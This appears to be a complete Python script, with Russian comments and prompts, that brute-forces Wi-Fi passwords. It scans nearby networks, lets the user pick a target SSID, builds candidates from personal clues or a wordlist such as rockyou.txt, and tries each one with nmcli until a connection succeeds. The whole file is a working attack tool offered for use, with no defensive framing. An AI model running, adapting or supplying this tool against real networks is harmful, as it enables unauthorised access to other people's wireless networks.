import subprocess
import time
import os
import itertools

def print_header(text):
    print("\n" + "="*50)
    print(f"[+] {text}")
    print("="*50)

# -------------------------------------------------------------------
# ИСТОЧНИК ПАРОЛЕЙ 1: Умный генератор по зацепкам
# -------------------------------------------------------------------
def smart_generator():
    print_header("Настройка умного генератора")
    base_word = input("[?] Введите базовое слово (например, название школы/колледжа): ").strip()
    year = input("[?] Введите важный год (например, 2026): ").strip()
    spec_char = input("[?] Введите спецсимвол (например, ! или @): ").strip()

    # Варианты написания базового слова
    words = [base_word, base_word.lower(), base_word.capitalize()]
    years = [year, ""]
    chars = [spec_char, ""]

    password_list = []
    # Модуль itertools красиво перемешивает всё между собой
    for w, y, c in itertools.product(words, years, chars):
        combined = f"{w}{y}{c}"
        # Wi-Fi пароль (WPA2) не может быть короче 8 символов
        if len(combined) >= 8:
            password_list.append(combined)
    
    # Убираем дубликаты
    password_list = list(set(password_list))
    print(f"[i] Генератор создал {len(password_list)} комбинаций для проверки.")
    return password_list

# -------------------------------------------------------------------
# ИСТОЧНИК ПАРОЛЕЙ 2: Чтение готового словаря из файла
# -------------------------------------------------------------------
def load_wordlist():
    print_header("Загрузка готового словаря")
    dict_path = input("[?] Введите полный путь к файлу (например, /usr/share/wordlists/rockyou.txt): ").strip()

    if not os.path.exists(dict_path):
        print(f"[-] Ошибка: Файл {dict_path} не найден!")
        return None

    password_list = []
    print("[*] Чтение файла и фильтрация паролей...")
    
    with open(dict_path, "r", encoding="utf-8", errors="ignore") as file:
        for line in file:
            password = line.strip()
            # Отсекаем слишком короткие пароли
            if len(password) >= 8:
                password_list.append(password)
                # Ограничим для первого теста 5000 строк, чтобы скрипт не завис намертво
                if len(password_list) >= 5000:
                    print("[i] Загружены первые 5000 подходящих паролей для теста.")
                    break
                    
    return password_list

# -------------------------------------------------------------------
# СЕРДЦЕ ПРОГРАММЫ: Цикл подбора для Wi-Fi
# -------------------------------------------------------------------
def brute_wifi_core(target_ssid, passwords):
    print_header(f"Запуск брутфорса сети: {target_ssid}")
    print(f"[i] Всего паролей на проверку: {len(passwords)}")
    
    for password in passwords:
        print(f"[*] Пробуем: {password} -> ", end="", flush=True)
        
        # Системная команда Linux для подключения к Wi-Fi
        cmd = ["nmcli", "dev", "wifi", "connect", target_ssid, "password", password]
        
        # Запускаем и перехватываем результат
        result = subprocess.run(cmd, capture_output=True, text=True)

        # returncode == 0 означает, что nmcli успешно подключился
        if result.returncode == 0:
            print("УСПЕХ!!!")
            print_header(f"ПАРОЛЬ НАЙДЕН: {password}")
            return True
        else:
            print("Не подошел.")
            # Ждем полсекунды, чтобы сетевая карта успевала сбросить сессию
            time.sleep(0.5)
            
    print("\n[-] Перебор окончен. Пароль не найден.")
    return False

# -------------------------------------------------------------------
# ГЛАВНЫЙ СТАРТ
# -------------------------------------------------------------------
def main():
    print_header("МИНИ-ГИДРА: МОДУЛЬ WI-FI")
    
    # 1. Показываем доступные сети
    print("[*] Сканируем доступные Wi-Fi сети вокруг...")
    subprocess.run(["nmcli", "-f", "SSID,SIGNAL", "dev", "wifi"])
    
    target_ssid = input("\n[?] Введите точное имя (SSID) целевой сети: ").strip()
    
    # 2. Выбираем режим получения паролей
    print("\nВыберите режим атаки:")
    print("1. Умный брутфорс (по зацепкам/информации)")
    print("2. Слепой брутфорс (по готовому файлу-словарю)")
    mode = input(">> ").strip()

    passwords = []
    if mode == "1":
        passwords = smart_generator()
    elif mode == "2":
        passwords = load_wordlist()
    else:
        print("[-] Неверный режим.")
        return

    # 3. Запуск брута
    if passwords:
        brute_wifi_core(target_ssid, passwords)

if __name__ == "__main__":
    main()